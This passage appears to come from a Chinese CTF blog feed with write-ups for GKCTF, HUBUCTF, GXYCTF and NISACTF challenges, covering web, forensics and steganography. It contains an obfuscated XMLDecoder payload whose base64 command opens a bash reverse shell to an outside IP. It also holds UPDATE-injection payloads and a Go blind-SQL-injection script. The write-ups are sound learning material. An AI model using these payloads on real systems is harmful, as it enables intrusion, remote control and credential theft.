class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230105100059.png"></p><p><img src="/../../../../pic/Pasted%20image%2020230105100032.png"></p><ul><li>预期解</li></ul><p>查看 baseDao</p><p><img src="/../../../../pic/Pasted%20image%2020230105091328.png"></p><p>在用户登录时会调用 getConnection() 进而调用 getConfig() 从而解析 /webapps/ROOT/db/db.xml，且文件上传出未做目录限制，可以实现文件覆盖随后重新登录用户实现命令执行</p><p>对文件内容的过滤可以使用实体编码绕过</p><p>这里使用 ProcessBuilder 进行反弹 shell</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.<span class="token entity" title="P">&amp;#80;</span><span class="token entity" title="r">&amp;#114;</span><span class="token entity" title="o">&amp;#111;</span><span class="token entity" title="c">&amp;#99;</span><span class="token entity" title="e">&amp;#101;</span><span class="token entity" title="s">&amp;#115;</span><span class="token entity" title="s">&amp;#115;</span><span class="token entity" title="B">&amp;#66;</span><span class="token entity" title="u">&amp;#117;</span><span class="token entity" title="i">&amp;#105;</span><span class="token entity" title="l">&amp;#108;</span><span class="token entity" title="d">&amp;#100;</span><span class="token entity" title="e">&amp;#101;</span><span class="token entity" title="r">&amp;#114;</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.String<span class="token punctuation">"</span></span> <span class="token attr-name">length</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>/bin/bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">&gt;</span></span>{echo,ZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTIxLjM3LjIxNy4xMzEvMTAwNjUgPCYx}|{base64,-d}|{bash,-i}                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>start<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传文件</p><p><img src="/../../../../pic/Pasted%20image%2020230105094411.png"></p><p>退出用户重新登录获得 shell</p><p><img src="/../../../../pic/Pasted%20image%2020230105094546.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUBUCTF 2022 新生赛</title>
      <link href="/2023/01/21/catchtheflag/games/hubuctf/hubuctf-2022-xin-sheng-sai/"/>
      <url>/2023/01/21/catchtheflag/games/hubuctf/hubuctf-2022-xin-sheng-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="HUBUCTF-2022-新生赛"><a href="#HUBUCTF-2022-新生赛" class="headerlink" title="HUBUCTF 2022 新生赛"></a>HUBUCTF 2022 新生赛</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-ezsql"><a href="#1-ezsql" class="headerlink" title="1. ezsql"></a>1. ezsql</h3><p>#UPDATE注入</p><ul><li>题目描述</li></ul><p>好想知道admin的密码呜呜呜~</p><ul><li>题目解析</li></ul><p>注册用户时发现 admin 用户注册不了</p><p>在更新用户信息时可能存在 SQL 注入</p><p>常见的更新语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> table_name <span class="token keyword">SET</span> column1<span class="token operator">=</span>value1<span class="token punctuation">,</span>column2<span class="token operator">=</span>value2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">WHERE</span> some_column<span class="token operator">=</span>some_value<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在各个参数处都进行测试</p><p><img src="/../../../../pic/Pasted%20image%2020230218121033.png"></p><p>查看结果·</p><p><img src="/../../../../pic/Pasted%20image%2020230218121052.png"></p><p>可知在 age 处存在 SQL 注入</p><p>获取下数据库内容</p><pre class="line-numbers language-none"><code class="language-none">nickname=admin888&amp;age=18,description=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;description=admin888&amp;token=nickname=admin888&amp;age=18,description=(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)%23&amp;description=admin888&amp;token=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是死活查不出来 users 表中的数据，一直报错，但是已知存在哪些列</p><p><img src="/../../../../pic/Pasted%20image%2020230218122009.png"></p><p>只能查询当前用户的信息，查询下当前用户的密码</p><p><img src="/../../../../pic/Pasted%20image%2020230218122128.png"></p><p>经过加密处理，看一下 MD5</p><p><img src="/../../../../pic/Pasted%20image%2020230218122149.png"></p><p>确认为 md5 加密过，利用 UPDATE 修改下所有用户的密码</p><pre class="line-numbers language-none"><code class="language-none">nickname=admin888&amp;age=18,password=0x3231323332663239376135376135613734333839346130653461383031666333%23&amp;description=admin888&amp;token=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用 admin / admin 进行登录</p><p><img src="/../../../../pic/Pasted%20image%2020230218122459.png"></p><p>因为之前的操作导致个人介绍被覆盖掉了，重新开个环境，修改下密码登录获得 flag</p><p><img src="/../../../../pic/Pasted%20image%2020230218122646.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-vmem"><a href="#1-vmem" class="headerlink" title="1. vmem"></a>1. vmem</h3><p>#内存取证</p><ul><li>题目描述</li></ul><p>虚拟机内存里有啥？</p><ul><li>题目解析</li></ul><p>下载下来附件</p><p><img src="/../../../../pic/Pasted%20image%2020230301152226.png"></p><p>使用 010Editor 打开后，文件头为 504B0304，说明是一个 zip 文件，修改后缀为 zip 后进行解压后获得两个文件，这里主要是对 vmem 文件进行提取</p><p>使用 volatility2 分析下镜像信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility_2.6_win64_standalone.exe <span class="token parameter variable">-f</span> Windows7.vmem imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230301152602.png"></p><p>操作系统为 Win7SP1x64</p><p>接下来常规操作读取下进程列表</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility_2.6_win64_standalone.exe <span class="token parameter variable">-f</span> Windows7.vmem <span class="token parameter variable">--profile</span> Win7SP1x64 pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230301152700.png"></p><p>存在一个 notepad.exe 进行，在存储镜像之前还在读写文件，将进程存储在内存中的信息导出来</p><pre class="line-numbers language-none"><code class="language-none">volatility_2.6_win64_standalone.exe -f Windows7.vmem --profile Win7SP1x64 memdump --pid 3828 --dump-dir ./output/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230301153249.png"></p><p>使用 strings 提取出来字符串</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings <span class="token number">3828</span>.dmp  <span class="token operator">|</span> <span class="token function">grep</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230301153344.png"></p><p>获取了一部分 flag，并且可知 flag 被分成了三个部分分别存储在 flag3.txt、flag.txt、flag2.png 中</p><p>读取下内存中存储的文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility_2.6_win64_standalone.exe <span class="token parameter variable">-f</span> Windows7.vmem <span class="token parameter variable">--profile</span> Win7SP1x64 filescan <span class="token operator">|</span> findstr <span class="token string">"flag"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230301153602.png"></p><p>将内容都导出来</p><pre class="line-numbers language-none"><code class="language-none">volatility_2.6_win64_standalone.exe -f Windows7.vmem --profile Win7SP1x64 dumpfiles -Q 0x000000005d98ecd0 --dump-dir ./output/volatility_2.6_win64_standalone.exe -f Windows7.vmem --profile Win7SP1x64 dumpfiles -Q 0x000000005e7f5070 --dump-dir ./output/volatility_2.6_win64_standalone.exe -f Windows7.vmem --profile Win7SP1x64 dumpfiles -Q 0x000000005eb84f20 --dump-dir ./output/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从图片中获得 flag 的中间部分的</p><p><img src="/../../../../pic/Pasted%20image%2020230301154603.png"></p><p>从 flag3.txt 中获取到一段加密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag3 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag3.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_enc <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag_enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xf</span> <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag_enc<span class="token punctuation">)</span><span class="token comment"># }al):{m)yh{})fo)oehn)`z)3)VPF|V^hg](t</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单的异或处理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag3 <span class="token operator">=</span> <span class="token string">"}al):{m)yh{})fo)oehn)`z)3)VPF|V^hg](t"</span>  flag_enc <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      flag_enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xf</span> <span class="token operator">-</span> <span class="token number">6</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag_enc<span class="token punctuation">)</span><span class="token comment"># _YOu_WanT!}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后组合出 flag</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF{W0w_y0u_G3t_th3_P4sSWd_YOu_WanT!}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HUBUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF 2019</title>
      <link href="/2023/01/21/catchtheflag/games/gxyctf/gxyctf-2019/"/>
      <url>/2023/01/21/catchtheflag/games/gxyctf/gxyctf-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="GXYCTF-2019"><a href="#GXYCTF-2019" class="headerlink" title="GXYCTF 2019"></a>GXYCTF 2019</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-SXMgdGhpcyBiYXNlPw-x3D-x3D"><a href="#1-SXMgdGhpcyBiYXNlPw-x3D-x3D" class="headerlink" title="1. SXMgdGhpcyBiYXNlPw=="></a>1. SXMgdGhpcyBiYXNlPw==</h3><p>#Base64隐写</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>Base64 隐写利用 Base64 编码的在末尾补 = 的特性在其中插入信息</p><p>我们要做的就是将插入的信息提取出来然后转换成所需的数据</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main    <span class="token keyword">import</span> <span class="token punctuation">(</span>     <span class="token string">"bufio"</span>      <span class="token string">"encoding/base64"</span>      <span class="token string">"fmt"</span>      <span class="token string">"os"</span>      <span class="token string">"regexp"</span>      <span class="token string">"strconv"</span>      <span class="token string">"syscall"</span><span class="token punctuation">)</span>    <span class="token keyword">func</span> <span class="token function">base64Diff</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2 <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span>     <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">{</span>           <span class="token keyword">return</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> <span class="token boolean">false</span>  <span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     file<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"flag-2.txt"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span>     <span class="token punctuation">}</span>     <span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>     result <span class="token operator">:=</span> <span class="token string">""</span>       <span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>        line<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           <span class="token keyword">break</span>        <span class="token punctuation">}</span>        decodeString<span class="token punctuation">,</span> err <span class="token operator">:=</span> base64<span class="token punctuation">.</span>StdEncoding<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           <span class="token keyword">break</span>        <span class="token punctuation">}</span>        encodedString <span class="token operator">:=</span> base64<span class="token punctuation">.</span>StdEncoding<span class="token punctuation">.</span><span class="token function">EncodeToString</span><span class="token punctuation">(</span>decodeString<span class="token punctuation">)</span>        compile <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`(=+)`</span><span class="token punctuation">)</span>        submatch <span class="token operator">:=</span> compile<span class="token punctuation">.</span><span class="token function">FindStringSubmatch</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>submatch<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>           <span class="token keyword">if</span> submatch<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"=="</span> <span class="token punctuation">{</span>              a <span class="token operator">:=</span> line<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span>              b <span class="token operator">:=</span> encodedString<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>encodedString<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>              result <span class="token operator">+=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%04s"</span><span class="token punctuation">,</span> strconv<span class="token punctuation">.</span><span class="token function">FormatInt</span><span class="token punctuation">(</span><span class="token function">int64</span><span class="token punctuation">(</span>a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> submatch<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span> <span class="token punctuation">{</span>              a <span class="token operator">:=</span> line<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>              b <span class="token operator">:=</span> encodedString<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>encodedString<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>              result <span class="token operator">+=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%02s"</span><span class="token punctuation">,</span> strconv<span class="token punctuation">.</span><span class="token function">FormatInt</span><span class="token punctuation">(</span><span class="token function">int64</span><span class="token punctuation">(</span>a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token punctuation">}</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>     <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span> <span class="token punctuation">{</span>        parseInt<span class="token punctuation">,</span> err <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">ParseInt</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           <span class="token keyword">return</span>        <span class="token punctuation">}</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>parseInt<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GXYCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NISACTF 2022</title>
      <link href="/2023/01/21/catchtheflag/games/nisactf/nisactf-2022/"/>
      <url>/2023/01/21/catchtheflag/games/nisactf/nisactf-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="NISACTF-2022"><a href="#NISACTF-2022" class="headerlink" title="NISACTF 2022"></a>NISACTF 2022</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-hardsql"><a href="#1-hardsql" class="headerlink" title="1. hardsql"></a>1. hardsql</h3><p>#SQL布尔盲注 #SQL_replace</p><ul><li>题目描述</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT passwd FROM users WHERE username='bilala' and passwd='<span class="token interpolation"><span class="token variable">$password</span></span>';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>题目解析</li></ul><p>使用布尔盲注注出来密码</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"io"</span><span class="token string">"net/http"</span><span class="token string">"net/url"</span><span class="token string">"regexp"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>target <span class="token operator">:=</span> <span class="token string">"http://1.14.71.254:28494/login.php"</span>dict <span class="token operator">:=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789 ./\\=&lt;&gt;?+&amp;*;:\"{}|^`#"</span>passwd <span class="token operator">:=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span><span class="token keyword">for</span> j <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>dict<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span> <span class="token punctuation">{</span>data <span class="token operator">:=</span> url<span class="token punctuation">.</span>Values<span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"bilala"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">:</span>   <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"0'or/**/passwd/**/like/**/'%v%%'#"</span><span class="token punctuation">,</span> passwd<span class="token operator">+</span><span class="token function">string</span><span class="token punctuation">(</span>dict<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span>response<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span>body<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>Body<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span>r <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`alert\('wrong password'\);`</span><span class="token punctuation">)</span><span class="token keyword">if</span> r<span class="token punctuation">.</span><span class="token function">MatchString</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>passwd <span class="token operator">+=</span> <span class="token function">string</span><span class="token punctuation">(</span>dict<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得密码 b2f2d15b3ae082ca29697d8dcd420fd7</p><p>登录进去之后获得源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//多加了亿点点过滤</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">alertMes</span><span class="token punctuation">(</span><span class="token variable">$mes</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script&gt;alert('<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$mes</span><span class="token punctuation">}</span></span>');location.href='<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>';&lt;/script&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">checkSql</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string 